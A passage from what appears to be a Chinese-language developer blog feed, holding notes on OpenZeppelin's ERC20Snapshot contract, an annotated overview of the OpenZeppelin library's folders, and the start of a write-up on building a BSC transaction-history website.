<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 快照id单调递增，第一个值为1。id为0无效。</span><br><span class="line">Counters.Counter private _currentSnapshotId;</span><br><span class="line"></span><br><span class="line">function _snapshot() internal virtual returns (uint256) &#123;</span><br><span class="line">    _currentSnapshotId.increment(); // ！！！快照id单调递增</span><br><span class="line"></span><br><span class="line">    uint256 currentId = _getCurrentSnapshotId(); // 获取当前的快照Id</span><br><span class="line">    emit Snapshot(currentId);</span><br><span class="line">    return currentId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="自定义快照id策略：">自定义快照id策略：</h3>
<p>自己实现了一下基于<code>blockNumber</code>的快照策略，详见<a href="https://jerrychan807.github.io/8661.html">文章</a></p>
<h3 id="继承图">继承图:</h3>
<p>用<code>Slither</code>生成的，方便参照去阅读源码<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/A1D0D3CA-E749-44C4-A30E-9441BAD82C15.png" alt="A1D0D3CA-E749-44C4-A30E-9441BAD82C15" /></p>
<h3 id="重要函数变量表：-4">重要函数变量表：</h3>
<table>
<thead>
<tr>
<th>Contract</th>
<th>Function/Variable</th>
<th>使用场景</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>ERC20Snapshot</td>
<td>_accountBalanceSnapshots</td>
<td>存储用户快照余额</td>
<td>二维数据结构</td>
</tr>
<tr>
<td>ERC20Snapshot</td>
<td>_totalSupplySnapshots</td>
<td>存储总供应量快照余额</td>
<td>一维数据结构</td>
</tr>
<tr>
<td>ERC20Snapshot</td>
<td>_currentSnapshotId</td>
<td>当前快照id</td>
<td>id为0无效，要具备单调性如单增</td>
</tr>
<tr>
<td>ERC20Snapshot</td>
<td>_snapshot()</td>
<td>创建一个新快照并返回其快照 ID</td>
<td>可重写该函数，自定义快照策略</td>
</tr>
<tr>
<td>ERC20Snapshot</td>
<td>_getCurrentSnapshotId()</td>
<td>获取当前的快照Id</td>
<td>xx</td>
</tr>
<tr>
<td>ERC20Snapshot</td>
<td>_updateSnapshot(Snapshots storage snapshots, uint256 currentValue)</td>
<td>更新快照</td>
<td>注意里面的触发快照的条件</td>
</tr>
</tbody>
</table>
<h1>Template</h1>
<table>
<thead>
<tr>
<th>Contract</th>
<th>Function/Variable</th>
<th>使用场景</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>xx</td>
<td>xx</td>
<td>xx</td>
<td>xx</td>
</tr>
<tr>
<td>xx</td>
<td>xx</td>
<td>xx</td>
<td>xx</td>
</tr>
</tbody>
</table>
<h1>Refs:</h1>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/README.adoc">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/README.adoc</a></p>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenZeppelin-代码库QuickView</title>
    <url>/2022/23566.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>OpenZeppelin代码库概览，了解有什么功能的库，方便后续使用</p>
<h1>文件夹：</h1>
<table>
<thead>
<tr>
<th>folder</th>
<th>模块功能</th>
<th>简述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access</td>
<td>权限控制</td>
<td>限制谁可以访问合约功能或何时可以访问的方法</td>
</tr>
<tr>
<td>crosschain</td>
<td>跨链</td>
<td>代币可跨链</td>
</tr>
<tr>
<td>finance</td>
<td>金融系统原型</td>
<td>支付拆分模式(单笔支付可自定义比例拆分成ether、erc20)、退休金模式(合约锁仓、按自定义时间释放给受益人)</td>
</tr>
<tr>
<td>governance</td>
<td>链上治理</td>
<td>链上投票协议</td>
</tr>
<tr>
<td>interfaces</td>
<td>标准接口</td>
<td>各类erc提案的标准接口库</td>
</tr>
<tr>
<td>metatx</td>
<td>元交易</td>
<td>——</td>
</tr>
<tr>
<td>mocks</td>
<td>模拟</td>
<td>——</td>
</tr>
<tr>
<td>proxy</td>
<td>可升级的代理合约模式</td>
<td>Transparent(可由管理员升级的代理)、UUPS(基于UUPS设计的可升级机制)</td>
</tr>
<tr>
<td>security</td>
<td>安全库</td>
<td>常见的安全实践：防重入、紧急响应机制</td>
</tr>
<tr>
<td>token</td>
<td>代币</td>
<td>ERC20(可替代代币)、ERC721(不可替代代币)、ERC1155(可/半可/不可替代代币)、ERC777(erc20+转账通知机制)</td>
</tr>
<tr>
<td>utils</td>
<td>实用工具</td>
<td>处理新数据类型、签名验证、安全数学计算等</td>
</tr>
<tr>
<td>vendor</td>
<td>第三方合约库</td>
<td>arbitrum、compound、optimism等</td>
</tr>
</tbody>
</table>
<h1>QuickView：</h1>
<h2 id="access-权限控制">access (权限控制)</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── access (权限控制)</span><br><span class="line">│   ├── AccessControl.sol (基于角色的访问控制机制)</span><br><span class="line">│   ├── AccessControlCrossChain.sol (扩展：跨链)</span><br><span class="line">│   ├── AccessControlEnumerable.sol (扩展：可枚举各角色的成员)</span><br><span class="line">│   ├── IAccessControl.sol</span><br><span class="line">│   ├── IAccessControlEnumerable.sol</span><br><span class="line">│   ├── Ownable.sol (管理员访问控制机制)</span><br></pre></td></tr></table></figure>
<h2 id="crosschain-跨链">crosschain (跨链)</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── crosschain (跨链)</span><br><span class="line">│   ├── CrossChainEnabled.sol (接收跨链消息时的控制执行流程)</span><br><span class="line">│   │</span><br><span class="line">│   ├── amb (在两个evm链之间中继任意数据)</span><br><span class="line">│   │   ├── CrossChainEnabledAMB.sol (基于amb bridge)</span><br><span class="line">│   │   └── LibAMB.sol</span><br><span class="line">│   ├── arbitrum</span><br><span class="line">│   │   ├── CrossChainEnabledArbitrumL1.sol (基于ArbitrumL1 bridge)</span><br><span class="line">│   │   ├── CrossChainEnabledArbitrumL2.sol (基于ArbitrumL2 bridge)</span><br><span class="line">│   │   ├── LibArbitrumL1.sol </span><br><span class="line">│   │   └── LibArbitrumL2.sol </span><br><span class="line">│   ├── errors.sol</span><br><span class="line">│   ├── optimism</span><br><span class="line">│   │   ├── CrossChainEnabledOptimism.sol (基于Optimism bridge)</span><br><span class="line">│   │   └── LibOptimism.sol</span><br><span class="line">│   └── polygon</span><br><span class="line">│       └── CrossChainEnabledPolygonChild.sol (基于Polygon bridge)</span><br></pre></td></tr></table></figure>
<h2 id="finance-金融系统原型">finance (金融系统原型)</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── finance (金融系统原型)</span><br><span class="line">│   ├── PaymentSplitter.sol (支付拆分模式:单笔支付可自定义比例拆分成ether、erc20)</span><br><span class="line">│   └── VestingWallet.sol (退休金模式:锁仓、按自定义时间释放给受益人) </span><br><span class="line">├── governance (链上治理)</span><br><span class="line">│   ├── Governor.sol (抽象合约:只包含治理系统的核心部分，需要用其他模块进行拓展)</span><br><span class="line">│   ├── IGovernor.sol</span><br><span class="line">│   ├── README.adoc</span><br><span class="line">│   ├── TimelockController.sol (时间锁控制器)</span><br><span class="line">│   ├── compatibility (兼容层)</span><br><span class="line">│   │   ├── GovernorCompatibilityBravo.sol</span><br><span class="line">│   │   └── IGovernorCompatibilityBravo.sol</span><br><span class="line">│   ├── extensions (拓展方案)</span><br><span class="line">│   │   ├── GovernorCountingSimple.sol (简单的投票机制,有3个投票选项:反对、赞成和弃权)</span><br><span class="line">│   │   ├── GovernorPreventLateQuorum.sol (防止持票巨鲸最后时刻控制投票结果)</span><br><span class="line">│   │   ├── GovernorProposalThreshold.sol (限制具有最低余额的代币持有者的提案)</span><br><span class="line">│   │   ├── GovernorSettings.sol (可更新治理方案的设置)</span><br><span class="line">│   │   ├── GovernorTimelockCompound.sol (加上复合时间锁)</span><br><span class="line">│   │   ├── GovernorTimelockControl.sol (加上时间锁)</span><br><span class="line">│   │   ├── GovernorVotes.sol (从代币中提取投票权重)</span><br><span class="line">│   │   ├── GovernorVotesComp.sol (从多个代币中提取投票权重)</span><br><span class="line">│   │   ├── GovernorVotesQuorumFraction.sol (从代币和法定人数中提取投票权重)</span><br><span class="line">│   │   └── IGovernorTimelock.sol </span><br><span class="line">│   └── utils</span><br><span class="line">│       ├── IVotes.sol</span><br><span class="line">│       └── Votes.sol (抽象合约：投票权可转移/委托,可汇集给代表代投)</span><br></pre></td></tr></table></figure>
<h2 id="interfaces-标准接口">interfaces (标准接口):</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── interfaces (标准接口)</span><br><span class="line">│   ├── IERC1155.sol (单合约可存多个代币)</span><br><span class="line">│   ├── IERC1155MetadataURI.sol</span><br><span class="line">│   ├── IERC1155Receiver.sol</span><br><span class="line">│   ├── IERC1271.sol (让智能合约验证其它智能合约的签名)</span><br><span class="line">│   ├── IERC1363.sol (在单个交易中,在转移/批准后允许回调)</span><br><span class="line">│   ├── IERC1363Receiver.sol</span><br><span class="line">│   ├── IERC1363Spender.sol</span><br><span class="line">│   ├── IERC165.sol (检测合约实现了哪些接口)</span><br><span class="line">│   ├── IERC1820Implementer.sol</span><br><span class="line">│   ├── IERC1820Registry.sol</span><br><span class="line">│   ├── IERC20.sol (可替代代币)</span><br><span class="line">│   ├── IERC20Metadata.sol</span><br><span class="line">│   ├── IERC2981.sol (NFT版权标准)</span><br><span class="line">│   ├── IERC3156.sol (闪电贷)</span><br><span class="line">│   ├── IERC3156FlashBorrower.sol</span><br><span class="line">│   ├── IERC3156FlashLender.sol</span><br><span class="line">│   ├── IERC4626.sol (代币化的金库)</span><br><span class="line">│   ├── IERC721.sol (不可替代代币)</span><br><span class="line">│   ├── IERC721Enumerable.sol</span><br><span class="line">│   ├── IERC721Metadata.sol</span><br><span class="line">│   ├── IERC721Receiver.sol</span><br><span class="line">│   ├── IERC777.sol (erc20+转账通知机制)</span><br><span class="line">│   ├── IERC777Recipient.sol</span><br><span class="line">│   ├── IERC777Sender.sol</span><br><span class="line">│   ├── draft-IERC1822.sol</span><br><span class="line">│   └── draft-IERC2612.sol</span><br></pre></td></tr></table></figure>
<h2 id="metatx-元交易">metatx (元交易):</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── metatx (元交易)</span><br><span class="line">│   ├── ERC2771Context.sol</span><br><span class="line">│   └── MinimalForwarder.sol</span><br></pre></td></tr></table></figure>
<h2 id="mocks-模拟">mocks (模拟)</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">│   </span><br><span class="line">├── mocks (模拟)</span><br><span class="line">│   ├── AccessControlCrossChainMock.sol</span><br><span class="line">│   ├── AccessControlEnumerableMock.sol</span><br><span class="line">│   ├── AccessControlMock.sol</span><br><span class="line">│   ├── AddressImpl.sol</span><br><span class="line">│   ├── ArraysImpl.sol</span><br><span class="line">│   ├── BadBeacon.sol</span><br><span class="line">│   ├── Base64Mock.sol</span><br><span class="line">│   ├── BitmapMock.sol</span><br><span class="line">│   ├── CallReceiverMock.sol</span><br><span class="line">│   ├── CheckpointsImpl.sol</span><br><span class="line">│   ├── ClashingImplementation.sol</span><br><span class="line">│   ├── ClonesMock.sol</span><br><span class="line">│   ├── ConditionalEscrowMock.sol</span><br><span class="line">│   ├── ContextMock.sol</span><br><span class="line">│   ├── CountersImpl.sol</span><br><span class="line">│   ├── Create2Impl.sol</span><br><span class="line">│   ├── DoubleEndedQueueMock.sol</span><br><span class="line">│   ├── DummyImplementation.sol</span><br><span class="line">│   ├── ECDSAMock.sol</span><br><span class="line">│   ├── EIP712External.sol</span><br><span class="line">│   ├── ERC1155BurnableMock.sol</span><br><span class="line">│   ├── ERC1155Mock.sol</span><br><span class="line">│   ├── ERC1155PausableMock.sol</span><br><span class="line">│   ├── ERC1155ReceiverMock.sol</span><br><span class="line">│   ├── ERC1155SupplyMock.sol</span><br><span class="line">│   ├── ERC1155URIStorageMock.sol</span><br><span class="line">│   ├── ERC1271WalletMock.sol</span><br><span class="line">│   ├── ERC165</span><br><span class="line">│   │   ├── ERC165InterfacesSupported.sol</span><br><span class="line">│   │   ├── ERC165MissingData.sol</span><br><span class="line">│   │   └── ERC165NotSupported.sol</span><br><span class="line">│   ├── ERC165CheckerMock.sol</span><br><span class="line">│   ├── ERC165Mock.sol</span><br><span class="line">│   ├── ERC165StorageMock.sol</span><br><span class="line">│   ├── ERC1820ImplementerMock.sol</span><br><span class="line">│   ├── ERC20BurnableMock.sol</span><br><span class="line">│   ├── ERC20CappedMock.sol</span><br><span class="line">│   ├── ERC20DecimalsMock.sol</span><br><span class="line">│   ├── ERC20FlashMintMock.sol</span><br><span class="line">│   ├── ERC20Mock.sol</span><br><span class="line">│   ├── ERC20PausableMock.sol</span><br><span class="line">│   ├── ERC20PermitMock.sol</span><br><span class="line">│   ├── ERC20SnapshotMock.sol</span><br><span class="line">│   ├── ERC20TokenizedVaultMock.sol</span><br><span class="line">│   ├── ERC20VotesCompMock.sol</span><br><span class="line">│   ├── ERC20VotesMock.sol</span><br><span class="line">│   ├── ERC20WrapperMock.sol</span><br><span class="line">│   ├── ERC2771ContextMock.sol</span><br><span class="line">│   ├── ERC3156FlashBorrowerMock.sol</span><br><span class="line">│   ├── ERC721BurnableMock.sol</span><br><span class="line">│   ├── ERC721EnumerableMock.sol</span><br><span class="line">│   ├── ERC721Mock.sol</span><br><span class="line">│   ├── ERC721PausableMock.sol</span><br><span class="line">│   ├── ERC721ReceiverMock.sol</span><br><span class="line">│   ├── ERC721RoyaltyMock.sol</span><br><span class="line">│   ├── ERC721URIStorageMock.sol</span><br><span class="line">│   ├── ERC721VotesMock.sol</span><br><span class="line">│   ├── ERC777Mock.sol</span><br><span class="line">│   ├── ERC777SenderRecipientMock.sol</span><br><span class="line">│   ├── EnumerableMapMock.sol</span><br><span class="line">│   ├── EnumerableSetMock.sol</span><br><span class="line">│   ├── EtherReceiverMock.sol</span><br><span class="line">│   ├── GovernorCompMock.sol</span><br><span class="line">│   ├── GovernorCompatibilityBravoMock.sol</span><br><span class="line">│   ├── GovernorMock.sol</span><br><span class="line">│   ├── GovernorPreventLateQuorumMock.sol</span><br><span class="line">│   ├── GovernorTimelockCompoundMock.sol</span><br><span class="line">│   ├── GovernorTimelockControlMock.sol</span><br><span class="line">│   ├── GovernorVoteMock.sol</span><br><span class="line">│   ├── GovernorWithParamsMock.sol</span><br><span class="line">│   ├── InitializableMock.sol</span><br><span class="line">│   ├── MathMock.sol</span><br><span class="line">│   ├── MerkleProofWrapper.sol</span><br><span class="line">│   ├── MulticallTest.sol</span><br><span class="line">│   ├── MulticallTokenMock.sol</span><br><span class="line">│   ├── MultipleInheritanceInitializableMocks.sol</span><br><span class="line">│   ├── OwnableMock.sol</span><br><span class="line">│   ├── PausableMock.sol</span><br><span class="line">│   ├── PullPaymentMock.sol</span><br><span class="line">│   ├── ReentrancyAttack.sol</span><br><span class="line">│   ├── ReentrancyMock.sol</span><br><span class="line">│   ├── RegressionImplementation.sol</span><br><span class="line">│   ├── SafeCastMock.sol</span><br><span class="line">│   ├── SafeERC20Helper.sol</span><br><span class="line">│   ├── SafeMathMock.sol</span><br><span class="line">│   ├── SignatureCheckerMock.sol</span><br><span class="line">│   ├── SignedMathMock.sol</span><br><span class="line">│   ├── SignedSafeMathMock.sol</span><br><span class="line">│   ├── SingleInheritanceInitializableMocks.sol</span><br><span class="line">│   ├── StorageSlotMock.sol</span><br><span class="line">│   ├── StringsMock.sol</span><br><span class="line">│   ├── TimersBlockNumberImpl.sol</span><br><span class="line">│   ├── TimersTimestampImpl.sol</span><br><span class="line">│   ├── UUPS</span><br><span class="line">│   │   ├── UUPSLegacy.sol</span><br><span class="line">│   │   └── UUPSUpgradeableMock.sol</span><br><span class="line">│   ├── VotesMock.sol</span><br><span class="line">│   ├── compound</span><br><span class="line">│   │   └── CompTimelock.sol</span><br><span class="line">│   ├── crosschain</span><br><span class="line">│   │   ├── bridges.sol</span><br><span class="line">│   │   └── receivers.sol</span><br><span class="line">│   └── wizard</span><br><span class="line">│       ├── MyGovernor1.sol</span><br><span class="line">│       ├── MyGovernor2.sol</span><br><span class="line">│       └── MyGovernor3.sol</span><br><span class="line">│</span><br></pre></td></tr></table></figure>
<h2 id="proxy-代理模式">proxy (代理模式):</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── proxy (代理模式)</span><br><span class="line">│   ├── Clones.sol (部署最简单代理合约的标准)</span><br><span class="line">│   ├── ERC1967</span><br><span class="line">│   │   ├── ERC1967Proxy.sol (调用委托给可更改的执行合约，防存储冲突)</span><br><span class="line">│   │   └── ERC1967Upgrade.sol</span><br><span class="line">│   ├── Proxy.sol</span><br><span class="line">│   ├── beacon</span><br><span class="line">│   │   ├── BeaconProxy.sol (执行合约地址存储在uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1中，防存储冲突)</span><br><span class="line">│   │   ├── IBeacon.sol</span><br><span class="line">│   │   └── UpgradeableBeacon.sol</span><br><span class="line">│   ├── transparent (透明代理)</span><br><span class="line">│   │   ├── ProxyAdmin.sol</span><br><span class="line">│   │   └── TransparentUpgradeableProxy.sol (可由管理员升级的代理。管理员可以访问管理功能，调用不会被转发)</span><br><span class="line">│   └── utils </span><br><span class="line">│       ├── Initializable.sol (基础合约，用于编写可升级合约)</span><br><span class="line">│       └── UUPSUpgradeable.sol (为 UUPS 代理设计的可升级机制)</span><br></pre></td></tr></table></figure>
<h2 id="security-安全机制库">security (安全机制库)</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── security (安全机制库)</span><br><span class="line">│   ├── Pausable.sol (一种可用于避免重入攻击的模式)</span><br><span class="line">│   ├── PullPayment.sol (在某些功能期间可以防止重入的修饰符)</span><br><span class="line">│   └── ReentrancyGuard.sol (一种常见的紧急响应机制，可以在修复待处理时暂停合约)</span><br></pre></td></tr></table></figure>
<h2 id="token-代币">token (代币)</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── token (代币)</span><br><span class="line">│   ├── ERC1155</span><br><span class="line">│   │   ├── ERC1155.sol</span><br><span class="line">│   │   ├── IERC1155.sol</span><br><span class="line">│   │   ├── IERC1155Receiver.sol</span><br><span class="line">│   │   ├── extensions (拓展)</span><br><span class="line">│   │   │   ├── ERC1155Burnable.sol (可销毁)</span><br><span class="line">│   │   │   ├── ERC1155Pausable.sol (可暂停)</span><br><span class="line">│   │   │   ├── ERC1155Supply.sol (可跟踪每个id的总供应量)</span><br><span class="line">│   │   │   ├── ERC1155URIStorage.sol (可管理uri的存储)</span><br><span class="line">│   │   │   └── IERC1155MetadataURI.sol</span><br><span class="line">│   │   ├── presets</span><br><span class="line">│   │   │   ├── ERC1155PresetMinterPauser.sol</span><br><span class="line">│   │   │   └── README.md</span><br><span class="line">│   │   └── utils</span><br><span class="line">│   │       ├── ERC1155Holder.sol</span><br><span class="line">│   │       └── ERC1155Receiver.sol</span><br><span class="line">│   ├── ERC20 (同质化代币)</span><br><span class="line">│   │   ├── ERC20.sol</span><br><span class="line">│   │   ├── IERC20.sol</span><br><span class="line">│   │   ├── extensions (拓展)</span><br><span class="line">│   │   │   ├── ERC20Burnable.sol (销毁自己的代币)</span><br><span class="line">│   │   │   ├── ERC20Capped.sol (在铸币时对总供应量设定一个不可变的上限值)</span><br><span class="line">│   │   │   ├── ERC20FlashMint.sol (支持闪电贷)</span><br><span class="line">│   │   │   ├── ERC20Pausable.sol (可暂停)</span><br><span class="line">│   │   │   ├── ERC20Snapshot.sol (有效存储过去的代币余额/供应量，以便以后随时查询)</span><br><span class="line">│   │   │   ├── ERC20TokenizedVault.sol</span><br><span class="line">│   │   │   ├── ERC20Votes.sol (支持投票和投票委托)</span><br><span class="line">│   │   │   ├── ERC20VotesComp.sol (支持投票和投票委托,兼容Compound的token，有uint96限制)</span><br><span class="line">│   │   │   ├── ERC20Wrapper.sol</span><br><span class="line">│   │   │   ├── IERC20Metadata.sol</span><br><span class="line">│   │   │   ├── draft-ERC20Permit.sol</span><br><span class="line">│   │   │   └── draft-IERC20Permit.sol</span><br><span class="line">│   │   ├── presets (预设、已废弃)</span><br><span class="line">│   │   │   ├── ERC20PresetFixedSupply.sol (预设固定供应量)</span><br><span class="line">│   │   │   ├── ERC20PresetMinterPauser.sol</span><br><span class="line">│   │   │   └── README.md</span><br><span class="line">│   │   └── utils</span><br><span class="line">│   │       ├── SafeERC20.sol</span><br><span class="line">│   │       └── TokenTimelock.sol (时间锁)</span><br><span class="line">│   ├── ERC721 非同质化代币</span><br><span class="line">│   │   ├── ERC721.sol</span><br><span class="line">│   │   ├── IERC721.sol</span><br><span class="line">│   │   ├── IERC721Receiver.sol</span><br><span class="line">│   │   ├── extensions (拓展)</span><br><span class="line">│   │   │   ├── ERC721Burnable.sol (可销毁)</span><br><span class="line">│   │   │   ├── ERC721Enumerable.sol</span><br><span class="line">│   │   │   ├── ERC721Pausable.sol (可暂停)</span><br><span class="line">│   │   │   ├── ERC721Royalty.sol ()</span><br><span class="line">│   │   │   ├── ERC721URIStorage.sol (可管理uri的存储)</span><br><span class="line">│   │   │   ├── IERC721Enumerable.sol</span><br><span class="line">│   │   │   ├── IERC721Metadata.sol</span><br><span class="line">│   │   │   └── draft-ERC721Votes.sol</span><br><span class="line">│   │   ├── presets</span><br><span class="line">│   │   │   └── ERC721PresetMinterPauserAutoId.sol</span><br><span class="line">│   │   └── utils</span><br><span class="line">│   │       └── ERC721Holder.sol</span><br><span class="line">│   ├── ERC777 (ERC20+转账通知机制)</span><br><span class="line">│   │   ├── ERC777.sol</span><br><span class="line">│   │   ├── IERC777.sol</span><br><span class="line">│   │   ├── IERC777Recipient.sol</span><br><span class="line">│   │   ├── IERC777Sender.sol</span><br><span class="line">│   │   └── presets</span><br><span class="line">│   │       └── ERC777PresetFixedSupply.sol</span><br><span class="line">│   └── common</span><br><span class="line">│       └── ERC2981.sol</span><br></pre></td></tr></table></figure>
<h2 id="utils-实用工具库">utils (实用工具库)</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">├── utils (实用工具库)</span><br><span class="line">│   ├── Address.sol</span><br><span class="line">│   ├── Arrays.sol</span><br><span class="line">│   ├── Base64.sol</span><br><span class="line">│   ├── Checkpoints.sol</span><br><span class="line">│   ├── Context.sol</span><br><span class="line">│   ├── Counters.sol</span><br><span class="line">│   ├── Create2.sol</span><br><span class="line">│   ├── Multicall.sol</span><br><span class="line">│   ├── README.adoc</span><br><span class="line">│   ├── StorageSlot.sol</span><br><span class="line">│   ├── Strings.sol</span><br><span class="line">│   ├── Timers.sol</span><br><span class="line">│   ├── cryptography</span><br><span class="line">│   │   ├── ECDSA.sol</span><br><span class="line">│   │   ├── MerkleProof.sol</span><br><span class="line">│   │   ├── SignatureChecker.sol</span><br><span class="line">│   │   └── draft-EIP712.sol</span><br><span class="line">│   ├── escrow</span><br><span class="line">│   │   ├── ConditionalEscrow.sol</span><br><span class="line">│   │   ├── Escrow.sol</span><br><span class="line">│   │   └── RefundEscrow.sol</span><br><span class="line">│   ├── introspection</span><br><span class="line">│   │   ├── ERC165.sol</span><br><span class="line">│   │   ├── ERC165Checker.sol</span><br><span class="line">│   │   ├── ERC165Storage.sol</span><br><span class="line">│   │   ├── ERC1820Implementer.sol</span><br><span class="line">│   │   ├── IERC165.sol</span><br><span class="line">│   │   ├── IERC1820Implementer.sol</span><br><span class="line">│   │   └── IERC1820Registry.sol</span><br><span class="line">│   ├── math</span><br><span class="line">│   │   ├── Math.sol</span><br><span class="line">│   │   ├── SafeCast.sol</span><br><span class="line">│   │   ├── SafeMath.sol</span><br><span class="line">│   │   ├── SignedMath.sol</span><br><span class="line">│   │   └── SignedSafeMath.sol</span><br><span class="line">│   └── structs</span><br><span class="line">│       ├── BitMaps.sol</span><br><span class="line">│       ├── DoubleEndedQueue.sol</span><br><span class="line">│       ├── EnumerableMap.sol</span><br><span class="line">│       └── EnumerableSet.sol</span><br></pre></td></tr></table></figure>
<h3 id="vendor-第三方库">vendor (第三方库)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└── vendor (第三方库)</span><br><span class="line">    ├── amb</span><br><span class="line">    │   └── IAMB.sol</span><br><span class="line">    ├── arbitrum</span><br><span class="line">    │   ├── IArbSys.sol</span><br><span class="line">    │   ├── IBridge.sol</span><br><span class="line">    │   ├── IInbox.sol</span><br><span class="line">    │   ├── IMessageProvider.sol</span><br><span class="line">    │   └── IOutbox.sol</span><br><span class="line">    ├── compound</span><br><span class="line">    │   └── ICompoundTimelock.sol</span><br><span class="line">    │   </span><br><span class="line">    ├── optimism</span><br><span class="line">    │   └── ICrossDomainMessenger.sol</span><br><span class="line">    │</span><br><span class="line">    └── polygon</span><br><span class="line">        └── IFxMessageProcessor.sol</span><br></pre></td></tr></table></figure>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>EIP-Ethereum Improvement Proposals 以太坊改进提案</p>
</li>
<li class="lvl-2">
<p>ERC-Ethereum Request for Comment 以太坊意见征求稿</p>
</li>
</ul>
</blockquote>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://eips.ethereum.org/erc">erc标准</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.youtube.com/watch?v=Kw9R-N2m98I">教程：以太坊智能合约(三十一) | Openzeppelin合约代码向导</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.openzeppelin.com/contracts/4.x/api/access">openzeppelin Docs</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-BscTradeHistory交易历史网站</title>
    <url>/2021/7095.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>debank是个很好用的产品,比如交易历史功能，相比原生的bscsan的原生记录，debank的展示得更清晰，某笔交易和哪个项目的做了什么交互动作、token的交换记录、gas费用转换成u显示。看着不错，仿照debank的交易历史功能做个小项目练练手。</p>
<h1>debank交易历史界面:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031160825.png" alt="20211031160825" /></p>
<p>有以下功能点:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>钱包余额总值</p>
</li>
<li class="lvl-2">
<p>不同的公链</p>
</li>
<li class="lvl-2">
<p>交易时间</p>
</li>
<li class="lvl-2">
<p>交易hash</p>
</li>
<li class="lvl-2">
<p>与什么合约做了什么交互动作</p>
</li>
<li class="lvl-2">
<p>token的传输记录，增加了X Token,减少了X Token</p>
</li>
<li class="lvl-2">
<p>gas费用换算成u</p>
</li>
</ul>
<h1>项目效果图:</h1>
<p>项目地址:<a href="https://github.com/jerrychan807/bsc_trade_history">bsc_trade_history</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211104122542.png" alt="20211104122542" /></p>
<h1>功能点:</h1>
<h2 id="合约交互记录-重点">合约交互记录-重点:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031161445.png" alt="20211031161445" /></p>
<p>有以下几个点:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>项目的logo</p>
</li>
<li class="lvl-2">
<p>项目名字</p>
</li>
<li class="lvl-2">
<p>调用合约的具体函数</p>
</li>
</ul>
<h2 id="合约交互记录-项目logo和名字">合约交互记录-项目logo和名字:</h2>
<p>交易记录里，会记录你地址与哪个合约发生了交互</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031161723.png" alt="20211031161723" /></p>
<p>可以知道合约地址，一个项目可以有好几个合约地址，比如<code>PancakeSwap</code>可以有几个合约地址</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>PancakeSwap: Router v2</code></p>
</li>
<li class="lvl-2">
<p><code>PancakeSwap: Router v1</code></p>
</li>
<li class="lvl-2">
<p>…</p>
</li>
</ul>
<p>这里主要是要找到<code>合约地址</code>和<code>项目</code>的映射关系暂时有几个思路:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>contract creator</code> 部署项目合约的地址</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031162907.png" alt="20211031162907" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在项目源码找常量，记录了那些项目合约地址</p>
</li>
</ul>
<p>这一块感觉后续要不断去维护这些映射关系</p>
<h2 id="合约交互记录-调用合约的具体函数">合约交互记录-调用合约的具体函数:</h2>
<p>调用bscscan的这个<code>Get a list of 'Normal' Transactions By Address</code>接口,可以获得以下数据</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211104123527.png" alt="20211104123527" /></p>
<p>调用合约的具体函数可以通过解析<code>input_data</code>得知</p>
<p>如果项目合约是开源验证过的话，可以通过<code>decode_function_input</code>接得</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">contract_ins = self.get_token_contract_with_abi(contract_address, contract_abi_json)</span><br><span class="line">func, params = contract_ins.decode_function_input(input_data)</span><br></pre></td></tr></table></figure>
<p>如果项目合约未开源,<code>input_data</code>的前4个字节是函数原型的<code>Keccak256</code>哈希，可以调用<a href="https://www.4byte.directory/docs/">4byte.directory</a>进行哈希查询，反查出函数名。</p>
<hr />
<h2 id="transaction里的token传输记录">transaction里的token传输记录:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211104131002.png" alt="20211104131002" /></p>
<p>要怎么解析出交易里代币的传输记录？<br />
